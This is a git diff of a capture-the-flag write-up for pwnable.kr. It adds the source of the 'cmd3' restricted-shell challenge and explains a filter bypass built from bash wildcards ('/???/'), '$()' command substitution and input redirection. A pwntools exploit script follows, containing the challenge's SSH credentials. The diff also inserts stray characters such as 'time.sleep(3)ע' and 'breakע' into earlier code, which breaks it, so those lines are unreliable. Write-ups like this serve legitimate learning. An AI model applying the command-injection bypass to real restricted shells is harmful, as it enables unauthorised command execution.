@@ -1,3 +1,5 @@
+### Here I will publish only the challenges I found easy, since I don't want everyone to get easy points :)
+
 ## Coin2 - Level 5
 ```
 	---------------------------------------------------
@@ -53,7 +55,7 @@ def is_set(x, n):
 
 p = remote("localhost" ,9008)
 print(p.recv().decode())
-time.sleep(3)
+time.sleep(3)ע
 for k in range(100):
 	N, C = [int(i.split("=")[1]) for i in p.recv().decode().split(" ")]
 
@@ -93,7 +95,7 @@ We need to solve 100 soduko boards with a twist.
 
 I grabbed the first sudoku solver online, and added the new rules.
 This is the code I have created:
-
+ע
 ```py
 from pwn import *
 
@@ -127,7 +129,7 @@ def solve(grid, row, col, num, smaller, comp, points):
 
 
 def Suduko(grid, row, col, smaller, comp, points):
-
+ע
     if (row == M - 1 and col == M):
         return True
     if col == M:
@@ -193,7 +195,7 @@ for i in range(100):
         l = server.recvline().decode()
         p = l.split(" ")[-1]
         if "," not in p:
-            break
+            breakע
         new_p = [int(p[1]), int(p[3])]
         points.append(new_p)
 
@@ -202,4 +204,100 @@ for i in range(100):
     server.sendline(str(grid))
 
 recvAll(server)
+```
+
+## Cmd3 - Level 10
+```py
+	#!/usr/bin/python
+import base64, random, math
+import os, sys, time, string
+from threading import Timer
+
+def rstring(N):
+	return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
+
+password = rstring(32)
+filename = rstring(32)
+
+TIME = 60
+class MyTimer():
+	global filename
+        timer=None
+        def __init__(self):
+                self.timer = Timer(TIME, self.dispatch, args=[])
+                self.timer.start()
+        def dispatch(self):
+                print 'time expired! bye!'
+		sys.stdout.flush()
+		os.system('rm flagbox/'+filename)
+                os._exit(0)
+
+def filter(cmd):
+	blacklist = '` !&|"\'*'
+	for c in cmd:
+		if ord(c)>0x7f or ord(c)<0x20: return False
+		if c.isalnum(): return False
+		if c in blacklist: return False
+	return True
+
+if __name__ == '__main__':
+	MyTimer()
+	print 'your password is in flagbox/{0}'.format(filename)
+	os.system("ls -al")
+	os.system("ls -al jail")
+	open('flagbox/'+filename, 'w').write(password)
+	try:
+		while True:
+			sys.stdout.write('cmd3$ ')
+			sys.stdout.flush()
+			cmd = raw_input()
+			if cmd==password:
+				os.system('./flagbox/print_flag')
+				raise 1
+			if filter(cmd) is False:
+				print 'caught by filter!'
+				sys.stdout.flush()
+				raise 1
+
+			os.system('echo "{0}" | base64 -d - | env -i PATH=jail /bin/rbash'.format(cmd.encode('base64')))
+			sys.stdout.flush()
+	except:
+		os.system('rm flagbox/'+filename)
+		os._exit(0)
+```
+
+This challenge is a really stupid one, and it doesn't require any special BE skills to be exploited.
+The idea here is that we are given some kind of shell, which is REALLY defended.
+we can't write any alphanumeric characters, we can't type special characters, and we can't type non-ascii characters.
+We are given the name of some file, and if we enter its content, we will be given the flag.
+The idea here is to use bash wildcards (specificlly the `?`, which serves as a single-character wild card for filename expansion in globbing)
+We can use this if we type `/???/`, and this way we can do things with the tmp directory.
+So my idea was to create a file which its name passes the filter (I've used `..__`).
+Another thing to notice is that we can run any command with the `$()` command substition.
+Together with the `<` input redirection symbol, we can read our created file and execute any command we want!
+
+Exploit:
+```py
+from pwn import *
+
+s = ssh(port=2222,user="cmd3",host="pwnable.kr",password="FuN_w1th_5h3ll_v4riabl3s_haha")
+
+
+p = remote("pwnable.kr",  9023)
+
+p.recvuntil("your password is in ")
+
+passcodeFile = p.recvline().rstrip().decode()
+
+s.run('touch /tmp/..__; echo "cat {0}" > /tmp/..__'.format(passcodeFile))
+
+print(p.recvuntil("cmd3$ "))
+
+p.sendline("$(</???/..__)")
+
+tmp = p.recv().decode()
+
+p.sendline(tmp)
+
+print(p.recvall().decode())
 ```
